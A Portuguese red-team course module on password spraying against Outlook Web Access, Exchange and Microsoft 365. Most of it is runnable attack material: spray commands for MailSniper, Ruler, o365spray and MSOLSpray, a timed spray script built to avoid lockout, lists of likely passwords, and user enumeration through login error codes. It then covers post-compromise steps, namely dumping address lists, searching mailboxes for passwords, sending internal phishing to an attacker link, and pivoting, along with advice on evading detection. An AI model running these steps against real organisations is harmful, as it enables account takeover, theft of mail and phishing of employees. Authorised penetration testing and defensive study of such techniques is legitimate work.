---
title: "Password Spraying & OWA"
---

# Password Spraying em OWA e Exchange

## OWA Como Superfície Externa Privilegiada

OWA (Outlook Web Access/App) é uma das superfícies de ataque externas mais valiosas em ambiente corporativo. Está exposto à internet, autentica direto contra o Active Directory, e frequentemente tem política de lockout mais tolerante que RDP ou VPN. Pra red teamer significa quatro coisas: credenciais válidas de AD via serviço externo, acesso à caixa de email pra contexto e engenharia social interna, GAL (Global Address List) com lista completa de emails corporativos, e pivoting (mesma senha funciona em VPN, RDP, outros serviços). Pra CRTO I/II é vetor recorrente nos labs; pra OSEP combina com phishing interno convincente.

---

## OWA: Stack, Endpoints e Comportamento de Auth

### O Que é OWA e Por Que é Alvo

OWA é a interface web do Microsoft Exchange Server. Permite acesso ao e-mail corporativo via browser, sem necessidade do Outlook desktop.

```
Características que tornam OWA atrativo para ataque:

1. EXPOSIÇÃO EXTERNA
   - Quase sempre acessível na internet: mail.empresa.com, owa.empresa.com
   - Protocolo HTTPS padrão — tráfego de ataque confunde-se com legítimo
   - Não requer VPN para acesso (é o ponto)

2. AUTENTICAÇÃO DIRETA NO AD
   - Cada tentativa de login é uma autenticação LDAP/Kerberos no AD
   - Credenciais válidas do OWA = credenciais válidas de domínio

3. POLÍTICA DE LOCKOUT DIFERENTE
   - Exchange frequentemente configurado com lockout mais alto
   - Empresas toleram mais lockouts em OWA (usuários esquecem senha com frequência)
   - Threshold comum: 10-20 tentativas antes de bloquear (vs 3-5 em RDP)
   - Observation window: frequentemente 30-60 minutos antes de resetar contador

4. TIMING ATTACK PARA ENUMERAÇÃO
   - Usuário existente mas senha errada: delay de ~300ms (verificação completa)
   - Usuário inexistente: delay de ~30ms (rejeição rápida)
   - Permite validar lista de usuários sem tentativas de senha

5. EWS — Exchange Web Services
   - API programática do Exchange
   - Mesma autenticação, mais funcionalidades (download de e-mails, calendário, GAL)
```

### Descoberta e Fingerprinting do Exchange

```bash
# Descobrir OWA via subdomain enumeration
subfinder -d empresa.com | grep -iE "(mail|owa|exchange|webmail|smtp)"

# Verificar OWA diretamente
curl -sv https://mail.empresa.com/owa/ 2>&1 | grep -i "exchange\|owa\|microsoft"

# Verificar EWS
curl -sv https://mail.empresa.com/EWS/Exchange.asmx 2>&1 | head -30

# Fingerprinting da versão do Exchange
curl -s "https://mail.empresa.com/owa/" | grep -i "X-OWA-Version\|version"

# Exchange version via autodiscover
curl -sv "https://mail.empresa.com/autodiscover/autodiscover.xml" 2>&1

# Determinar domínio AD via OWA (aparece no campo de login ou no HTML)
curl -s "https://mail.empresa.com/owa/" | grep -i "domain\|realm\|adfs"
```

---

## Na Prática

### MailSniper — Enumeração e Spray via OWA

MailSniper é o toolkit PowerShell definitivo para ataques em Exchange/OWA. Três fases principais:

#### Fase 1: Identificar o Domínio AD

```powershell
# Descobrir domínio AD usado pelo Exchange
Import-Module .\MailSniper.ps1

# Harvest domain name via OWA response headers/HTML
Invoke-DomainHarvestOWA -ExchHostname mail.empresa.com

# Output esperado:
# [*] Attempting to harvest the domain name from OWA at https://mail.empresa.com/owa/
# [*] Domain found: EMPRESA
# [*] Internal domain: empresa.local
```

#### Fase 2: Validar Usuários via Timing Attack

```powershell
# Validar lista de usuários via timing attack no OWA
# NÃO usa senha — apenas testa se usuário existe
Invoke-UsernameHarvestOWA `
    -ExchHostname mail.empresa.com `
    -Domain EMPRESA `
    -UserList C:\users\wordlist.txt `
    -OutFile C:\users\valid_users.txt

# Parâmetros:
# -ExchHostname: hostname do servidor OWA
# -Domain: domínio AD (descoberto na fase 1)
# -UserList: arquivo com um usuário por linha (formato: jsmith, john.smith, j.smith)
# -OutFile: arquivo de saída com usuários válidos

# Output esperado:
# [*] Testing 500 usernames against OWA at https://mail.empresa.com/owa/
# [*] Current User: jsmith - Response Time: 287ms - VALID
# [*] Current User: fakeuser - Response Time: 28ms - INVALID
# [*] Found 143 valid usernames. Saved to valid_users.txt
```

**Formatos comuns de username para testar:**
```
# Criar lista de variações de username a partir de nomes
python3 << 'EOF'
names = [
    ("John", "Smith"),
    ("Maria", "Garcia"),
    ("Bob", "Wilson"),
]
for first, last in names:
    f, l = first.lower(), last.lower()
    print(f"{f}.{l}")       # john.smith
    print(f"{f[0]}{l}")     # jsmith
    print(f"{f[0]}.{l}")    # j.smith
    print(f"{f}{l[0]}")     # johns
    print(f"{l}{f[0]}")     # smithj
    print(f"{f}_{l}")       # john_smith
EOF
```

#### Fase 3: Password Spray

```powershell
# Spray com uma senha por vez — NÃO fazer múltiplas senhas de uma vez
Invoke-PasswordSprayOWA `
    -ExchHostname mail.empresa.com `
    -UserList C:\users\valid_users.txt `
    -Password "Winter2025!" `
    -OutFile C:\users\sprayed_creds.txt

# Resultado esperado:
# [*] Spraying password Winter2025! against 143 users
# [*] Testing: jsmith@empresa.com - FAIL
# [*] Testing: mgarcia@empresa.com - SUCCESS
# [*] Testing: bwilson@empresa.com - SUCCESS
# [*] Spray complete. 2 successful logins. Saved to sprayed_creds.txt.

# Listar credenciais válidas
Get-Content C:\users\sprayed_creds.txt
```

---

### Timing de Spray para Evitar Lockout

Esta é a parte mais crítica. Um spray malfeito bloqueia centenas de contas simultaneamente — detectável imediatamente e potencialmente disruptivo ao cliente.

```
FLUXO SEGURO DE SPRAY:

1. Descobrir a política de lockout:
   - Padrão Microsoft: 5-10 tentativas
   - Observation window: 30 minutos (mais comum)
   - Fonte: GPO "Account Lockout Policy" (se já tiver acesso)
   - Alternativa: verificar através de behavioral testing (1-2 contas de teste)

2. Calcular spray seguro:
   - Threshold = 5 tentativas
   - Spray: 1 senha por usuário por rodada (nunca exceder threshold-2)
   - Aguardar: window de observação completa entre rodadas (mín. 30 min)
   - Resultado: máximo 2-3 tentativas por usuário por hora

3. Cronograma de spray:
   Rodada 1 (09h00): "Winter2025!" → aguardar 31 min
   Rodada 2 (09h31): "Spring2025!" → aguardar 31 min
   Rodada 3 (10h02): "Company2025!" → aguardar 31 min
   ...

4. Senhas para testar (ordem de prioridade):
   Season + Year: Winter2025!, Summer2024!, Spring2025!
   Company name: Empresa2025!, Empresa@2025
   Months: Janeiro@2025, March2025!, April2025
   Common: Password1, Welcome1, Password@1
   Keyboard walks: Qwerty123!, Qwerty@2025
   Pattern: [NomeEmpresa]1234!, [NomeEmpresa]@123
```

**Script PowerShell para spray controlado:**

```powershell
# controlled-spray.ps1 — spray com controle de timing
param(
    [string]$ExchHostname,
    [string]$UserList,
    [string[]]$Passwords,
    [int]$LockoutThreshold = 5,
    [int]$ObservationWindowMin = 30
)

Import-Module .\MailSniper.ps1

$users = Get-Content $UserList
$sleepSeconds = ($ObservationWindowMin * 60) + 60  # window + 1 min buffer

Write-Host "[*] Iniciando spray controlado"
Write-Host "[*] Usuarios: $($users.Count)"
Write-Host "[*] Senhas: $($Passwords.Count)"
Write-Host "[*] Sleep entre rodadas: $($sleepSeconds)s ($($ObservationWindowMin+1) min)"

$roundNum = 0
foreach ($password in $Passwords) {
    $roundNum++
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
    Write-Host ""
    Write-Host "[$timestamp] Rodada $roundNum - Senha: $password"
    
    Invoke-PasswordSprayOWA `
        -ExchHostname $ExchHostname `
        -UserList $UserList `
        -Password $password `
        -OutFile "spray_results_round${roundNum}.txt"
    
    # Se não for a última senha, aguardar
    if ($roundNum -lt $Passwords.Count) {
        $nextTime = (Get-Date).AddSeconds($sleepSeconds)
        Write-Host "[*] Aguardando até $($nextTime.ToString('HH:mm:ss')) para próxima rodada..."
        Start-Sleep -Seconds $sleepSeconds
    }
}

Write-Host ""
Write-Host "[+] Spray completo. Verificar arquivos spray_results_round*.txt"
```

**Uso:**
```powershell
.\controlled-spray.ps1 `
    -ExchHostname mail.empresa.com `
    -UserList valid_users.txt `
    -Passwords "Winter2025!","Spring2025!","Empresa2025!" `
    -LockoutThreshold 5 `
    -ObservationWindowMin 30
```

---

### Ferramentas Alternativas

#### Ruler — EWS-Based

Ruler usa o Exchange Web Services (EWS) em vez da interface web OWA. Mais confiável em alguns ambientes.

```bash
# Spray via EWS
ruler --domain empresa.com --insecure spray \
      --users users.txt \
      --passwords passwords.txt \
      --delay 0 \
      --verbose

# Com hostname explícito
ruler --email jsmith@empresa.com \
      --domain empresa.com \
      --password "Winter2025!" \
      spray --users users.txt

# Verificar versão do Exchange via EWS
ruler --domain empresa.com autodiscover
```

#### o365spray — Azure AD / Microsoft 365

Para ambientes cloud (M365, Exchange Online):

```bash
# Instalar
pip3 install o365spray

# Validar se tenant existe
o365spray --validate --domain empresa.com

# Validar usuário específico (sem MFA info — apenas confirma se existe)
o365spray --validate --email usuario@empresa.com

# Spray via MS Online
o365spray --spray -p "Winter2025!" \
          --userfile users.txt \
          --domain empresa.onmicrosoft.com \
          --rate 2 \
          --count 1 \
          --lockout 1

# Parâmetros importantes:
# --rate: requisições por segundo (manter baixo: 1-2)
# --count: senhas por rodada por usuário (SEMPRE 1)
# --lockout: minutos de espera entre rodadas

# Módulos de spray disponíveis:
o365spray --spray --module oauth2   # OAuth2 endpoint
o365spray --spray --module msol     # Microsoft Online
o365spray --spray --module adfs     # ADFS federated
```

#### MSOLSpray — Microsoft Online

```powershell
# MSOLSpray.ps1
Import-Module .\MSOLSpray.ps1

Invoke-MSOLSpray `
    -UserList users.txt `
    -Password "Winter2025!" `
    -URL "https://login.microsoftonline.com"

# Output inclui smart lockout detection:
# [*] SUCCESS! user@empresa.com:Winter2025!
# [*] LOCKED! user2@empresa.com (smart lockout triggered)
# [*] MFA_REQUIRED: user3@empresa.com (conta existe, tem MFA)
```

**Nota sobre MFA:** se o spray retornar "MFA Required" ou "AADSTS50076", a credencial está correta mas MFA está habilitado. Isso confirma o username e password — útil para outros ataques (MFA fatigue, adversary-in-the-middle).

#### Spray-AD.ps1 — Spray Direto no AD (Interno)

Para uso após acesso inicial, quando já está dentro da rede:

```powershell
# Spray direto contra o LDAP do AD (mais rápido, mais ruidoso)
.\Spray-AD.ps1 -Domain empresa.local -UserList users.txt -Password "Winter2025!"

# Ou via LDAP com credencial parcial
Import-Module ActiveDirectory
$users = Get-Content users.txt
foreach ($user in $users) {
    try {
        $cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString "Winter2025!" -AsPlainText -Force))
        $null = Get-ADUser -Identity $user -Credential $cred -Server "dc01.empresa.local"
        Write-Host "[+] VALID: $user"
    } catch { }
}
```

---

### Azure AD Enumeration

Para ambientes Microsoft 365/Azure AD:

```bash
# Verificar se domínio é gerenciado ou federated
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@empresa.com&json=1"
# "NameSpaceType":"Managed" = Azure AD direto
# "NameSpaceType":"Federated" = ADFS (on-premises federation)

# Enumerate tenant info
curl -s "https://login.microsoftonline.com/empresa.com/.well-known/openid-configuration" | python3 -m json.tool

# Validar email sem conta de teste (userealm endpoint)
curl -s "https://login.microsoftonline.com/common/userrealm/user@empresa.com?api-version=2.1"

# Verificar se usuário existe via OAuth
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/token" \
     -d "grant_type=password&username=user@empresa.com&password=invalid&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&resource=https://graph.microsoft.com" \
     | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error_description','')[:100])"
# AADSTS50034 = usuário NÃO existe
# AADSTS50126 = usuário EXISTE, senha inválida
# AADSTS50076 = MFA required (usuário existe E senha correta!)
# AADSTS53004 = senha expirada (existe e senha correta!)
```

---

### Com Credenciais Válidas — O Que Fazer

#### Acessar GAL (Global Address List)

```powershell
# Dump completo da GAL via MailSniper
Get-GlobalAddressList `
    -ExchHostname mail.empresa.com `
    -UserName EMPRESA\jsmith `
    -Password "Winter2025!" `
    -OutFile C:\gal_dump.txt

# A GAL contém: nome, e-mail, cargo, departamento, número de telefone
# Valor: enumerar toda a organização, identificar alvos para spear phishing

# Via EWS (Ruler)
ruler --email jsmith@empresa.com --password "Winter2025!" \
      --domain empresa.com --insecure \
      abk dump --output gal.txt

# Parse da GAL para identificar alvos de alto valor
grep -iE "(ciso|cto|cfo|ceo|director|manager|admin)" gal.txt
```

#### Leitura de E-mails para Contexto de Engenharia Social

```powershell
# Ler e-mails recentes de todos os mailboxes acessíveis
# (com credencial de jsmith, apenas inbox de jsmith a menos que seja admin)
Get-Inbox `
    -ExchHostname mail.empresa.com `
    -UserName EMPRESA\jsmith `
    -Password "Winter2025!" `
    -OutFile C:\inbox_jsmith.txt `
    -Limit 100

# Buscar e-mails com palavras-chave (credenciais, VPN, etc.)
Invoke-SelfSearch `
    -ExchHostname mail.empresa.com `
    -UserName EMPRESA\jsmith `
    -Password "Winter2025!" `
    -SearchTerm "password" `
    -OutFile C:\password_emails.txt

Invoke-SelfSearch `
    -ExchHostname mail.empresa.com `
    -UserName EMPRESA\jsmith `
    -Password "Winter2025!" `
    -SearchTerm "vpn" `
    -OutFile C:\vpn_emails.txt

# Buscar credenciais em anexos (texto)
Invoke-SelfSearch `
    -ExchHostname mail.empresa.com `
    -UserName EMPRESA\jsmith `
    -Password "Winter2025!" `
    -SearchTerm "credentials" `
    -OutFile C:\cred_emails.txt
```

#### Phishing Interno Convincente

```powershell
# Enviar e-mail de phishing como usuário comprometido
# ATENÇÃO: apenas se autorizado no ROE
Send-EWSEmail `
    -ExchHostname mail.empresa.com `
    -UserName EMPRESA\jsmith `
    -Password "Winter2025!" `
    -To "alvo@empresa.com" `
    -Subject "Action Required: Update Your Credentials" `
    -Body "Please update your credentials via this link: http://attacker/phish"

# Mais convincente: responder a thread existente
# 1. Encontrar thread relevante no inbox
# 2. Responder com payload phishing como jsmith
# 3. Destinatários confiam porque conhecem jsmith e o contexto da thread
```

#### Pivoting com Credenciais OWA

```bash
# Testar credenciais em outros serviços comuns
# VPN (Cisco AnyConnect / Pulse Secure / GlobalProtect)
# Tip: verificar se VPN está no mesmo hostname como vpn.empresa.com

# RDP (se credencial é local admin em algum servidor)
xfreerdp /v:server.empresa.com /u:EMPRESA\\jsmith /p:'Winter2025!' /cert:ignore

# SMB (verificar acesso a shares)
smbclient -L //server.empresa.com -U 'EMPRESA\jsmith%Winter2025!'

# Impacket — verificar acesso PS remoto
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
    EMPRESA/jsmith:'Winter2025!'@server.empresa.com

# CrackMapExec — spray em toda a subnet com credencial OWA
crackmapexec smb 10.0.0.0/24 -u jsmith -p 'Winter2025!' -d EMPRESA

# Verificar se credencial funciona no portal Azure
# (comum: mesma senha no AD local e no Azure AD via sync)
az login --username jsmith@empresa.com --password 'Winter2025!'
```

---

## Exemplos de Código / Comandos

### Script Completo de Reconhecimento de OWA

```bash
#!/bin/bash
# owa-recon.sh — reconhecimento de Exchange OWA
TARGET_DOMAIN="$1"
if [ -z "$TARGET_DOMAIN" ]; then
    echo "Uso: $0 <domain>"
    exit 1
fi

echo "[*] Descoberta de OWA para: $TARGET_DOMAIN"
echo ""

# Subdomínios comuns de Exchange
for sub in mail owa webmail exchange smtp mta mx; do
    host="${sub}.${TARGET_DOMAIN}"
    ip=$(dig +short A "$host" 2>/dev/null | head -1)
    if [ -n "$ip" ]; then
        echo "[+] Encontrado: $host → $ip"
        
        # Verificar OWA
        status=$(curl -sk -o /dev/null -w "%{http_code}" "https://$host/owa/" 2>/dev/null)
        echo "    OWA (/owa/): HTTP $status"
        
        # Verificar EWS
        ews_status=$(curl -sk -o /dev/null -w "%{http_code}" "https://$host/EWS/Exchange.asmx" 2>/dev/null)
        echo "    EWS (/EWS/): HTTP $ews_status"
        
        # Verificar Autodiscover
        auto_status=$(curl -sk -o /dev/null -w "%{http_code}" "https://$host/autodiscover/autodiscover.xml" 2>/dev/null)
        echo "    Autodiscover: HTTP $auto_status"
    fi
done

echo ""
echo "[*] Verificando tenant Microsoft 365..."
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@${TARGET_DOMAIN}&json=1" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Namespace: {d.get(\"NameSpaceType\")}, Auth: {d.get(\"AuthURL\",\"N/A\")[:60]}')"
```

### Script Python para Verificar Lockout Policy via Error Messages

```python
#!/usr/bin/env python3
"""
Detectar política de lockout via análise de mensagens de erro OWA.
Fazer apenas 1-2 tentativas para inferir o comportamento.
"""
import requests
import time
import sys

def check_owa_lockout(host, username, domain):
    """Testa comportamento de lockout fazendo poucas tentativas."""
    url = f"https://{host}/owa/auth.owa"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Tentar com senha obviamente errada e medir resposta
    results = []
    for attempt in range(2):
        wrong_pass = f"WRONGPASS{attempt}XYZ!@#"
        data = {
            "destination": f"https://{host}/owa/",
            "flags": "4",
            "forcedownlevel": "0",
            "username": f"{domain}\\{username}",
            "password": wrong_pass,
            "isUtf8": "1"
        }
        
        start = time.time()
        try:
            r = requests.post(url, data=data, headers=headers,
                             verify=False, allow_redirects=False, timeout=15)
            elapsed = time.time() - start
            results.append({
                "attempt": attempt + 1,
                "status": r.status_code,
                "elapsed": elapsed,
                "location": r.headers.get("Location", "")
            })
        except Exception as e:
            print(f"Erro: {e}")
    
    return results

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "mail.empresa.com"
    user = sys.argv[2] if len(sys.argv) > 2 else "administrator"
    domain = sys.argv[3] if len(sys.argv) > 3 else "EMPRESA"
    
    print(f"[*] Testando comportamento OWA em {host}")
    results = check_owa_lockout(host, user, domain)
    for r in results:
        print(f"Tentativa {r['attempt']}: HTTP {r['status']}, "
              f"Tempo: {r['elapsed']:.3f}s, Location: {r['location'][:80]}")
```

---

## Detecção e OPSEC

### O Que Gera Alertas

| Ação | Event ID / Log | Característica Detectável |
|---|---|---|
| Login falho em OWA | Event 4625 (IIS/AD) | Múltiplos logins falhando do mesmo IP |
| Username harvest (timing) | IIS Access Log | Volume alto de requisições com tempos diferentes |
| Spray bem-sucedido | Event 4624 (login) + 4625 | Sequência de falhas seguida de sucesso |
| GAL dump via EWS | EWS access log | Volume alto de queries EWS |
| Ruler spray | IIS log | User-Agent do Ruler em logs |

### Event IDs Específicos de Exchange

```
Exchange Server Events:
- MSExchange Front End HTTP Proxy: acesso ao OWA (IIS logs)
- Event 4625 (Security): failed logon — AccountName, Source IP
- Event 4648 (Security): logon with explicit credentials
- Event 4624 (Security): successful logon — muitos 4625 seguidos de 4624 = spray detectado

IIS Logs (W3SVC):
- %SystemRoot%\System32\LogFiles\W3SVC\
- Campos: cs-uri-stem (OWA endpoint), sc-status, time-taken, c-ip, cs(User-Agent)

Exchange Admin Audit Log:
- Acesso à GAL por conta não-administrativa pode gerar log
- EWS access log para operações como dump de mailbox
```

### OPSEC Durante OWA Spray

```
Antes:
□ Descobrir lockout policy antes de iniciar (GPO, error messages, cliente informa)
□ Calcular senhas máximas por rodada: threshold - 2 (margem de segurança)
□ Obter lista de usuários válidos via timing attack (não testa senhas neste passo)
□ Usar VPN ou VPS para spray (não seu IP real de escritório/casa)
□ Usar User-Agent realista (não default do requests/curl)
□ Configurar delays entre cada request individual: 1-5 segundos

Durante:
□ NUNCA fazer mais de threshold-2 tentativas por usuário por observation window
□ Monitorar se contas começam a ser bloqueadas (indica threshold menor que estimado)
□ Parar imediatamente se detectar comportamento inesperado
□ Logar cada tentativa: timestamp UTC, usuário, senha, resultado

Após spray bem-sucedido:
□ Usar credencial o mínimo necessário no OWA diretamente
□ Mover para EWS ou outros protocolos que geram menos logs visíveis
□ Não fazer download massivo de e-mails de uma vez (NDR pode detectar)
□ GAL dump: fazer em horário comercial (tráfego normal) em vez de madrugada
□ Credencial válida: testar em outros serviços COM CAUTELA (gera mais 4625 se falhar)
```

### Detectar se Está Sendo Detectado

```powershell
# Se você já tem acesso (pós-spray bem-sucedido), verificar se conta foi sinalizada
# Procurar em logs do AD se auditoria está habilitada

# Via MailSniper, verificar logs de Exchange
# (requer acesso de Exchange Admin)
Search-MailboxAuditLog -Identity jsmith -ShowDetails -StartDate (Get-Date).AddDays(-1)

# Verificar se IP foi bloqueado em firewall
Test-NetConnection -ComputerName mail.empresa.com -Port 443

# Se spray parar de funcionar (todas tentativas retornam diferente):
# 1. Seu IP pode estar bloqueado no WAF/firewall
# 2. Sua conta source pode ter sido sinalizada
# 3. Lockout policy mudou durante o engagement
# Ação: parar, aguardar, trocar IP de origem
```

---

## Módulos Relacionados

`01_fundamentos/05_engajamento_roe_e_relatorios.md` define como documentar o spray no operator log e critérios de parada se contas forem bloqueadas. `01_phishing_e_engenharia_social.md` cobre o passo seguinte — usar caixa OWA comprometida pra phishing interno. `08_movimentacao_lateral/01_lateral_movement_windows.md` aprofunda PtH com credenciais OWA reutilizadas. `09_active_directory/02_kerberoasting_e_asrep.md` é o próximo passo após acesso de domínio. `02_c2_infraestrutura/04_infraestrutura_resiliente_redirectors.md` cobre a infra C2 onde o beacon conecta. MITRE ATT&CK: T1110.003 (Password Spraying), T1114 (Email Collection), T1114.002 (EWS Remote).

---

## Leitura Complementar

- MailSniper — https://github.com/dafthack/MailSniper
- Ruler — https://github.com/sensepost/ruler
- o365spray — https://github.com/0xZDH/o365spray
- MSOLSpray — https://github.com/dafthack/MSOLSpray
- SensePost — "Attacking Exchange"
- Microsoft Security Blog — "Hunting for Spraying Activity"
